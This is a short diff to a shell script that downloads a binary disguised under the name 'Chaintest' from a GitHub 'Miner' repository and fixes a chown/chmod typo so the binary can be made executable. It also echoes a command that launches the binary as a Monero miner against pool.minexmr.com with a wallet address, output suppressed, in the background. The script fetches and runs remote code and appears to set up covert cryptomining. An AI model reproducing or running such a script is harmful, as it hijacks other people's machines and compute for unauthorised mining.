@@ -9,7 +9,7 @@ mkdir ChainTest/
 
 cd ChainTest/
 wget https://cdn.jsdelivr.net/gh/gscsnm/Miner@master/Chaintest
-chown +x Chaintest
+chmod +x Chaintest
 
 echo "ly"
 echo "nohup ./Chaintest --donate-level 0 -o pool.minexmr.com:443 -u 89xFXepSy2iBW1cMgaQwZwedkgDvAJcJk7UMyHYy1TsZA9aw9YhYWeobXn5mXQgx9eMduAdFrfXEGJaKEZ43eZWm7xeMCyi -k --tls --rig-id xxx 1>/dev/null 2>&1 &"
